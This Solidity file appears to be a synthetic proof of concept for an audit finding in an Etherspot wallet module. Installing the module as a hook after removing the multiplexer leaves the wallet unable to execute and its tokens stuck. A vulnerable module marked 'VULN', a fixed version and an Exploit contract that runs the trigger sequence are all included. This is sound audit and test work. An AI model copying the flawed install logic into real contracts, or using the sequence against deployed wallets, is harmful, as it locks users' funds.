// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot — uninstalling the multiplexer and then installing the module
    as a hook DoSes the wallet (Shieldify, finding #61414 / H-04, July 2025).

    SYNTHETIC, cheatcode-free. Validator install requires the multiplexer to
    be the active hook. Hook install does not check that a validator is
    already set. After the multiplexer is removed and the module is installed
    as the hook, execute's preCheck reverts and N = 1000 GLUE stays in the
    wallet. The fixed onInstall rejects the hook install, so the validator
    can be uninstalled and execute still pays N. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Multiplexer {}

contract CredibleAccountModule {
    address public immutable multiplexer;
    mapping(address => address) public activeHook;
    mapping(address => bool) public validatorInitialized;
    mapping(address => bool) public hookInitialized;

    error InconsistentModule();

    constructor(address multiplexer_) {
        multiplexer = multiplexer_;
    }

    function setMultiplexer(address wallet) external {
        activeHook[wallet] = multiplexer;
    }

    function clearHook(address wallet) external {
        activeHook[wallet] = address(0);
    }

    function onInstall(address wallet, uint256 moduleType) external {
        if (moduleType == 1) {
            require(activeHook[wallet] == multiplexer, "mux");
            validatorInitialized[wallet] = true;
        } else if (moduleType == 2) {
            hookInitialized[wallet] = true;
            // @> VULN: hook install does not care that this wallet is already a validator
            activeHook[wallet] = address(this);
        } else {
            revert("type");
        }
    }

    function onUninstall(address wallet, uint256 moduleType) external {
        if (moduleType == 1) {
            require(activeHook[wallet] == multiplexer, "mux");
            validatorInitialized[wallet] = false;
        } else if (moduleType == 2) {
            require(!validatorInitialized[wallet], "validator");
            hookInitialized[wallet] = false;
        } else {
            revert("type");
        }
    }

    function preCheck(address wallet) external view {
        if (hookInitialized[wallet] && validatorInitialized[wallet] && activeHook[wallet] != multiplexer) {
            revert InconsistentModule();
        }
    }
}

contract CredibleAccountModuleFixed {
    address public immutable multiplexer;
    mapping(address => address) public activeHook;
    mapping(address => bool) public validatorInitialized;
    mapping(address => bool) public hookInitialized;

    error AlreadyValidator();

    constructor(address multiplexer_) {
        multiplexer = multiplexer_;
    }

    function setMultiplexer(address wallet) external {
        activeHook[wallet] = multiplexer;
    }

    function onInstall(address wallet, uint256 moduleType) external {
        if (moduleType == 1) {
            require(activeHook[wallet] == multiplexer, "mux");
            validatorInitialized[wallet] = true;
        } else if (moduleType == 2) {
            if (validatorInitialized[wallet]) revert AlreadyValidator();
            hookInitialized[wallet] = true;
            activeHook[wallet] = address(this);
        } else {
            revert("type");
        }
    }

    function onUninstall(address wallet, uint256 moduleType) external {
        if (moduleType == 1) {
            require(activeHook[wallet] == multiplexer, "mux");
            validatorInitialized[wallet] = false;
        } else if (moduleType == 2) {
            require(!validatorInitialized[wallet], "validator");
            hookInitialized[wallet] = false;
        }
    }

    function preCheck(address wallet) external view {
        if (hookInitialized[wallet] && validatorInitialized[wallet] && activeHook[wallet] != multiplexer) {
            revert("inconsistent");
        }
    }
}

contract Wallet {
    Token public token;
    address public module;

    constructor(Token token_, address module_) {
        token = token_;
        module = module_;
    }

    function execute(address to, uint256 amount) external returns (bool ok) {
        (bool success,) = module.call(abi.encodeWithSignature("preCheck(address)", address(this)));
        if (!success) return false;
        token.transfer(to, amount);
        return true;
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Token public token;
    Multiplexer public multiplexer;
    CredibleAccountModule public module;
    Wallet public wallet;

    constructor() {
        token = new Token("Glue", "GLUE", 18);
        multiplexer = new Multiplexer();
        module = new CredibleAccountModule(address(multiplexer));
        wallet = new Wallet(token, address(module));
    }

    function run() external {
        token.mint(address(wallet), N);
        module.setMultiplexer(address(wallet));
        module.onInstall(address(wallet), 1);
        module.clearHook(address(wallet));
        module.onInstall(address(wallet), 2);
        (bool removedValidator,) =
            address(module).call(abi.encodeWithSignature("onUninstall(address,uint256)", address(wallet), uint256(1)));
        (bool removedHook,) =
            address(module).call(abi.encodeWithSignature("onUninstall(address,uint256)", address(wallet), uint256(2)));
        require(!removedValidator, "validator uninstall should fail");
        require(!removedHook, "hook uninstall should fail");
        bool ok = wallet.execute(address(this), N);
        require(!ok, "execute should revert");
        require(module.validatorInitialized(address(wallet)), "validator stuck");
        require(module.hookInitialized(address(wallet)), "hook stuck");
        require(module.activeHook(address(wallet)) != address(multiplexer), "mux still hook");
        require(token.balanceOf(address(wallet)) == N, "N left the wallet");
        require(token.balanceOf(address(this)) == 0, "caller was paid");
    }
}
